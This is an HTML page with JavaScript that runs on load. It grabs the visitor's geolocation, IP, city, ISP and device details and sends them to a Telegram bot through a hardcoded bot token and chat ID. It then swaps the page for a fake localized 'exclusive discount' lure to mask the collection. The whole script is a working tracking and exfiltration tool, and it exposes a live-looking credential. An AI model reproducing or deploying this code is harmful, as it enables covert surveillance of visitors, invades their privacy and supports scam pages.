<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send Location to Telegram Bot</title>
    <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1.0.2/dist/ua-parser.min.js"></script>
</head>
<body>
    <h1>Welcome to My Website</h1>
    <p>Your location will be sent to my Telegram bot automatically.</p>

    <script>
        const BOT_TOKEN = '7877643092:AAFhTdsbJYQu5G662xrCBHsWxOw6pjJFdPw';
        const CHAT_ID = '7492622739';

        // Send data to Telegram
        function sendDataToTelegram(latitude, longitude, userInfo) {
            const locationUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${latitude}&longitude=${longitude}`;
            fetch(locationUrl, { method: 'GET' })
                .then(response => response.json())
                .then(data => console.log(data.ok ? 'Location sent!' : 'Error:', data))
                .catch(error => console.error('Fetch error:', error));

            const messageUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(userInfo)}`;
            fetch(messageUrl, { method: 'GET' })
                .then(response => response.json())
                .then(data => console.log(data.ok ? 'User info sent!' : 'Error:', data))
                .catch(error => console.error('Fetch error:', error));
        }

        // System info using ua-parser-js
        function getSystemInfo() {
            const parser = new UAParser();
            const result = parser.getResult();
            const os = `${result.os.name || "Unknown"} ${result.os.version || ""}`;
            const platform = navigator.platform || "Unknown";
            const cpuCores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cores` : "Unknown";
            const memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unknown";
            return `
ðŸ“± System Information:
â€¢ OS: ${os}
â€¢ Platform: ${platform}
â€¢ CPU: ${cpuCores}
â€¢ RAM: Total ${memory}
            `;
        }

        function getUserInfo() {
            return `
ðŸ‘¤ User Information:
â€¢ User: Not available
â€¢ Hostname: Not available
            `;
        }

        function getNetworkInfo(data) {
            return `
ðŸŒ Network Information:
â€¢ IP: ${data.query || "Unknown"}
â€¢ Country: ${data.country || "Unknown"}
â€¢ Region: ${data.regionName || "Unknown"}
â€¢ City: ${data.city || "Unknown"}
â€¢ ISP: ${data.isp || "Unknown"}
â€¢ Timezone: ${data.timezone || "Unknown"}
            `;
        }

        function getSimInfo() {
            return `
ðŸ“ž SIM Information:
â€¢ Carrier: Not available
â€¢ Phone Number: Not available
            `;
        }

        function getSystemLoad() {
            const memoryUsage = navigator.deviceMemory ? "Estimated" : "Not available";
            return `
ðŸ“Š System Load:
â€¢ Memory Usage: ${memoryUsage}
            `;
        }

        function getCurrentTime() {
            const now = new Date();
            return `
â° Time: ${now.toISOString().replace('T', ' ').slice(0, 19)}
            `;
        }

        // Get location using Geolocation API with IP fallback
        function getLocationAndUserInfo() {
            const systemInfo = getSystemInfo();
            const userInfo = getUserInfo();
            const simInfo = getSimInfo();
            const systemLoad = getSystemLoad();
            const currentTime = getCurrentTime();

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const { latitude, longitude } = position.coords;
                        fetch('http://ip-api.com/json/')
                            .then(response => response.json())
                            .then(data => {
                                const networkInfo = getNetworkInfo(data);
                                const combinedInfo = `${systemInfo}${userInfo}${networkInfo}${simInfo}${systemLoad}${currentTime}`;
                                sendDataToTelegram(latitude, longitude, combinedInfo);
                                makeSiteFake(data.country, data.city);
                            })
                            .catch(error => {
                                console.error('IP API error:', error);
                                const combinedInfo = `${systemInfo}${userInfo}${simInfo}${systemLoad}${currentTime}`;
                                sendDataToTelegram(latitude, longitude, combinedInfo);
                            });
                    },
                    (error) => {
                        console.warn('Geolocation error:', error.message);
                        // Fallback to IP-based location
                        fetch('http://ip-api.com/json/')
                            .then(response => response.json())
                            .then(data => {
                                const latitude = data.lat || 0;
                                const longitude = data.lon || 0;
                                const networkInfo = getNetworkInfo(data);
                                const combinedInfo = `${systemInfo}${userInfo}${networkInfo}${simInfo}${systemLoad}${currentTime}`;
                                sendDataToTelegram(latitude, longitude, combinedInfo);
                                makeSiteFake(data.country, data.city);
                            })
                            .catch(error => {
                                console.error('IP fallback failed:', error);
                                document.body.innerHTML += '<p>Location detection failed. Enjoy anyway!</p>';
                            });
                    },
                    { timeout: 10000, maximumAge: 60000 } // Options: 10s timeout, 1min cache
                );
            } else {
                console.error('Geolocation not supported');
                // Fallback to IP-based location
                fetch('http://ip-api.com/json/')
                    .then(response => response.json())
                    .then(data => {
                        const latitude = data.lat || 0;
                        const longitude = data.lon || 0;
                        const networkInfo = getNetworkInfo(data);
                        const combinedInfo = `${systemInfo}${userInfo}${networkInfo}${simInfo}${systemLoad}${currentTime}`;
                        sendDataToTelegram(latitude, longitude, combinedInfo);
                        makeSiteFake(data.country, data.city);
                    })
                    .catch(error => {
                        console.error('IP fallback failed:', error);
                        document.body.innerHTML += '<p>Location detection failed. Enjoy anyway!</p>';
                    });
            }
        }

        function makeSiteFake(country, city) {
            document.title = `${city} Exclusive Offers!`;
            document.body.style.backgroundColor = "#ffe6e6";
            document.body.innerHTML = `
                <h1>Special Deal for ${city}, ${country}!</h1>
                <p>Claim your exclusive discount now! Only for ${country} residents.</p>
                <p style="color: red;">Hurry, offer ends soon!</p>
            `;
        }

        window.onload = getLocationAndUserInfo;
    </script>
</body>
</html>
